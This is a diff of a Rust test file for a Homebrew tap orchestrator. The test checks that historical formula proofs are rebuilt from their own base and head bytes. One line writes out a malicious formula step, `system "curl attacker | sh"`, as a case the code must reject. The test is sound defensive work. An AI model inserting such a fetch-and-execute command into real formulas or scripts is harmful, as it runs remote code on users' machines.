@@ -1,55 +1,56 @@
-use super::{
-    identity::{belongs_to_receipt, branch_base, branch_prefix},
-    reconstruct_historical_proof,
-};
+use super::identity::{belongs_to_receipt, branch_base, branch_prefix};
 
 #[test]
 fn historical_formula_proof_uses_its_own_head_and_base_bytes() {
-    let fixture = crate::tap_test_support::fixture();
+    let fixture = crate::homebrew::test_support::fixture();
     let old_base_sha = "b".repeat(40);
-    let old_proof = reconstruct_historical_proof(
-        &fixture.plan.repository,
-        &fixture.policy,
-        &fixture.plan,
-        &fixture.release,
+    let sdk_artifact_digest = "c".repeat(64);
+    let old_proof = reconstruct(
+        &fixture,
+        &sdk_artifact_digest,
         &old_base_sha,
         &fixture.base_formula,
         &fixture.proposed_formula,
     )
     .expect("original base to original head formula is canonical");
 
-    let mut evolved_base = fixture.base_formula.clone();
-    let evolved = String::from_utf8(evolved_base.clone())
+    let evolved_base = render_base_for_source(&fixture, &"d".repeat(40));
+    let unrecognized_base = String::from_utf8(evolved_base.clone())
         .expect("formula is UTF-8")
         .replace(
             "bin.install \"cli\"",
             "bin.install \"cli\"\n    # trusted install logic evolved",
-        );
-    evolved_base = evolved.into_bytes();
+        )
+        .into_bytes();
     assert!(
-        reconstruct_historical_proof(
-            &fixture.plan.repository,
-            &fixture.policy,
-            &fixture.plan,
-            &fixture.release,
+        reconstruct(
+            &fixture,
+            &sdk_artifact_digest,
             &"c".repeat(40),
-            &evolved_base,
+            &unrecognized_base,
             &fixture.proposed_formula,
         )
         .is_err(),
-        "old head bytes are invalid against evolved trusted base logic"
+        "a base with unrecognized formula logic is rejected"
     );
-    let evolved_head = canonical_rewrite(&fixture, &evolved_base);
-    let current_proof = reconstruct_historical_proof(
-        &fixture.plan.repository,
-        &fixture.policy,
-        &fixture.plan,
-        &fixture.release,
+    let current_proof = reconstruct(
+        &fixture,
+        &sdk_artifact_digest,
         &"c".repeat(40),
         &evolved_base,
-        &evolved_head,
+        &fixture.proposed_formula,
     )
-    .expect("evolved base to its canonical head formula");
+    .expect("a recognized older formula base to this receipt's canonical formula");
+    assert_eq!(current_proof.base_sha, "c".repeat(40));
+    assert_eq!(
+        current_proof.old_formula_sha256,
+        crate::tap_prepare::sha256(&evolved_base)
+    );
+    assert_eq!(
+        current_proof.formula_spec_digest,
+        Some(fixture.spec.digest().expect("spec digest"))
+    );
+    assert_eq!(current_proof.sdk_artifact_digest, sdk_artifact_digest);
     assert_ne!(
         velnor_actions_contract::canonical_json_bytes(&old_proof).expect("old proof bytes"),
         velnor_actions_contract::canonical_json_bytes(&current_proof).expect("current proof bytes")
@@ -59,11 +60,9 @@ fn historical_formula_proof_uses_its_own_head_and_base_bytes() {
         .expect("formula is UTF-8")
         .replace("bin.install \"cli\"", "system \"curl attacker | sh\"");
     assert!(
-        reconstruct_historical_proof(
-            &fixture.plan.repository,
-            &fixture.policy,
-            &fixture.plan,
-            &fixture.release,
+        reconstruct(
+            &fixture,
+            &sdk_artifact_digest,
             &old_base_sha,
             &fixture.base_formula,
             malicious.as_bytes(),
@@ -73,18 +72,51 @@ fn historical_formula_proof_uses_its_own_head_and_base_bytes() {
     );
 }
 
-fn canonical_rewrite(fixture: &crate::tap_test_support::TapFixture, base: &[u8]) -> Vec<u8> {
-    let text = std::str::from_utf8(base).expect("formula is UTF-8");
-    text.replace(
-        "bbbbbbb000000000000000000000000000000000",
-        &fixture.release.receipt.source.commit_sha,
+fn reconstruct(
+    fixture: &crate::homebrew::test_support::TapFixture,
+    sdk_artifact_digest: &str,
+    base_sha: &str,
+    base_formula: &[u8],
+    proposed_formula: &[u8],
+) -> Result<crate::tap_prepare::HomebrewTapPreparationProof, crate::OrchestratorError> {
+    super::reconstruct_historical_proof(crate::tap_prepare::HistoricalCandidateInput {
+        source_repository: &fixture.plan.repository,
+        tap: &fixture.policy,
+        plan: &fixture.plan,
+        release: &fixture.release,
+        spec: Some(&fixture.spec),
+        sdk_artifact_digest,
+        base_sha,
+        base_formula,
+        proposed_formula,
+    })
+}
+
+fn render_base_for_source(
+    fixture: &crate::homebrew::test_support::TapFixture,
+    source_sha: &str,
+) -> Vec<u8> {
+    use velnor_actions_contract::homebrew_spec::{
+        HomebrewFormulaReleaseLiterals, render_homebrew_formula, validate_homebrew_projection,
+    };
+
+    let projection =
+        validate_homebrew_projection(&fixture.spec, &fixture.plan).expect("fixture projection");
+    let assets = projection
+        .selected_payloads()
+        .iter()
+        .map(|payload| (payload.asset_name().to_owned(), "a".repeat(64)))
+        .collect();
+    let literals = HomebrewFormulaReleaseLiterals::new(
+        &fixture.spec,
+        &projection,
+        source_sha.to_owned(),
+        format!("1.2.3-preview.8+{}", &source_sha[..7]),
+        format!("preview-{source_sha}"),
+        assets,
     )
-    .replace(
-        "1.2.3-preview.8+bbbbbbb",
-        &fixture.release.receipt.version.value,
-    )
-    .replace("v1.2.3-preview.8+bbbbbbb", &fixture.release.receipt.tag)
-    .into_bytes()
+    .expect("alternate base literals");
+    render_homebrew_formula(&fixture.spec, &literals).expect("alternate base formula")
 }
 
 #[test]
